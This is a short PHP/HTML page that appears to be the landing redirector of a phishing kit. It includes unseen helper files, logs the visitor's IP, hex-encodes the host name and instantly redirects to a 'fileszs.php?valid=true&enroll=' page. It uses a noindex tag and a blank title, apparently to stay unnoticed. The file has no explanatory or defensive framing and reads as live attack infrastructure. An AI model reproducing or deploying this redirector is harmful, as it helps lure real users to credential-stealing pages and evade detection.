<?php
require_once 'bk.php';
$ip = getenv("REMOTE_ADDR");
$hosnm = bin2hex ($_SERVER['HTTP_HOST']);
$redit = "fileszs.php?valid=true&enroll=$hosnm&$ip";
require_once 'ec.php';
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html lang="en">
<head>
<meta name="robots" content="noindex,nofollow" />
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<title>-</title>
<link rel="SHORTCUT ICON" href="wp/ico.ico" /> 
<meta http-equiv="refresh" content="0;url=<?php echo $redit; ?>"> 
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<body onload="unhideBody()">
</head>
<body>
</body>
</html>
<?php ob_end_flush(); ?>